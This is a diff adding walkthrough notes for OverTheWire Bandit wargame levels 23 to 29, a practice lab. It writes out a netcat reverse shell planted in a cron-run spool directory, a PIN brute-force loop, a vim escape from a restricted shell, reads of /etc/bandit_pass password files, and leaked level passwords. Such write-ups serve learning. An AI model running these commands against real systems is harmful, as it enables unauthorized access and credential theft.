@@ -178,3 +178,102 @@ cat /etc/cron.d/cronjob_bandit23 # runs as: bandit23
 cat /usr/bin/cronjob_bandit23.sh
 cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
 ```
+
+## 23-24
+
+```sh
+ls -Alp /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit24 # runs as: bandit24, once a minute.
+cat /usr/bin/cronjob_bandit24.sh
+```
+
+* `man stat` display file or file system status
+* `man timeout` run a command with a time limit
+* `/var/spool` data awaiting processing (outgoing mails, print jobs, etc.)
+
+```sh
+cd /var/spool/bandit24
+# guess you could call that a local reverse shell:
+echo 'nc -e /bin/bash localhost 12345' > ben; chmod +x ben; nc -lvp 12345
+
+# wait for connection.
+whoami # bandit24, nice.
+cat /etc/bandit_pass/bandit24
+```
+
+## 24-25
+
+```sh
+nc localhost 30002
+# ok, so: password space pin.
+# invalid entry let's you try again.
+
+for pin in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin >> /tmp/ben; done
+cat /tmp/ben | nc localhost 30002 | uniq -u # filter out duplicate error messages.
+rm /tmp/ben
+```
+
+## 25-26 and 26-27
+
+```sh
+cat bandit26.sshkey # copy it to host into file: sshkey26
+```
+
+```sh
+ssh bandit26@bandit.labs.overthewire.org -p 2220 -i sshkey26 # immediate exit.
+# we have a new ascii art, so it's probably figlet.
+figlet bandit26 # yep, it's even the default font.
+
+# ssh to 25 and look up the shell:
+cat /etc/passwd|grep 26 # bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+file /usr/bin/showtext
+cat /usr/bin/showtext # it's more!
+cat /home/bandit26/text.txt # permission denied. we don't really need it either.
+
+# but more does not stay open :/
+# let's fix that:
+figlet bandit26 | wc -l # the ascii art has 6 lines.
+stty rows 5 # set terminal height to 5 to force more to scroll.
+ssh bandit26@bandit.labs.overthewire.org -p 2220 -i sshkey26 # we got more!
+
+? # see our options.
+v # open vim :D
+# resize tmux to update stty rows value and give us some room.
+:e. # get a list of files in pwd. notice bandit27-do
+:e /etc/bandit_pass/bandit26 # 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+:set shell # shell=/usr/bin/showtext
+:set shell=/bin/bash # let's get a proper shell!
+:!whoami # bandit26
+:!./bandit27-do cat /etc/bandit_pass/bandit27 # 3ba3118a22e93127a4ed485be72ef5ea
+```
+* you can also login directly from bandit25:
+
+```sh
+./25 # login to bandit25
+ssh -i bandit26.sshkey bandit26@localhost
+```
+
+## 27-28
+
+```sh
+./27 # login to bandit27
+mkdir /tmp/benben
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo /tmp/benben
+cd /tmp/benben
+ls -Alp
+cat README # 0ef186ac70e04ea33b4c1853d2526fa2
+```
+
+## 28-29
+
+```sh
+mkdir /tmp/benbenben && cd /tmp/benbenben
+git clone ssh://bandit28-git@localhost/home/bandit28-git/repo /tmp/benbenben
+cat README
+# username: bandit29
+# password has been removed, but properly?
+git log # 'fix info leak' amazing :D
+git checkout c086d11a00c0648d095d04c089786efef5e01264
+cat README.md # bbc96594b4e001778eee9975372716b2
+```
